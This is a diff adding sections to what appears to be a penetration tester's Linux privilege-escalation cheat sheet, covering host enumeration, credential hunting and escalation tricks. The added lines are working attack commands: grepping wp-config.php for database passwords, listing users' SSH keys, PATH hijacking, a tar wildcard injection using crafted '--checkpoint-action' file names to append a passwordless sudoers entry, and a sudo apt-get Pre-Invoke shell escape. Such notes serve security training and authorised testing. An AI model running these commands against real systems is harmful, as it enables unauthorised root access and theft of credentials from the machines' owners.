@@ -1550,9 +1550,131 @@ ls -l /tmp /var/tmp /dev/shm
 ```
 ip a
 ```
+### Network Hosts
+```
+cat /etc/hosts
+```
+### User's Last Login
+```
+lastlog
+```
+### Logged in users
+```
+w
+```
+### Command History
+```
+history
+```
+### Finding History Files
+```
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+```
+### Cronjobs
+```
+ls -la /etc/cron.daily/
+```
+### Proc
+```
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+```
+## Services
+### Installed Services
+```
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+```
+### Sudo Version
+```
+sudo -v
+```
+### Binaries
+```
+ls -l /bin /usr/bin/ /usr/sbin/
+```
+### GTFO Bins
+```
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+```
+### Trace System Calls
+```
+strace ping -c1 10.129.112.20
+```
+### Configuration Files
+```
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+```
+### Scripts
+```
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+```
+### RUnning Services by User
+```
+ps aux | grep root
+```
+
+## Credential Hunting
+### Find Config Files
+```
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+```
+### DB Password from File
+```
+cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
+```
+### SSH Keys
+```
+ls /home/*/.ssh
+```
 
 ## Environment-Based Privilege Escalation
+### Path Abuse
+#### Show Path
+```
+echo $PATH
+```
+#### Abuse Path
+```
+echo $PATH > /tmp/path.txt
+PATH=.:${PATH}
+export PATH
+echo $PATH
+touch lsx
+echo 'echo "PATH ABUSE!!"' > lsx
+chmod +x lsx
+lsx
+```
+### Wildcard Abuse
+#### Wildcard Abuse with Tar
+```
+echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+
+### Escape Restricted Shells
+```
+https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
+```
+
 ## Permissions-Based Privilege Escalation
+### Special Permissions - setuid = s
+```
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+### Special Permissions - setgid = s
+```
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+### Sudo Permissions
+```
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+```
+### GTFO Bins
+```
+https://gtfobins.github.io/
+```
+
+
 ## Service-Based Privilege Escalation
 ## Linux Internals-Based Privilege Escalation
 ## Recent 0-Days
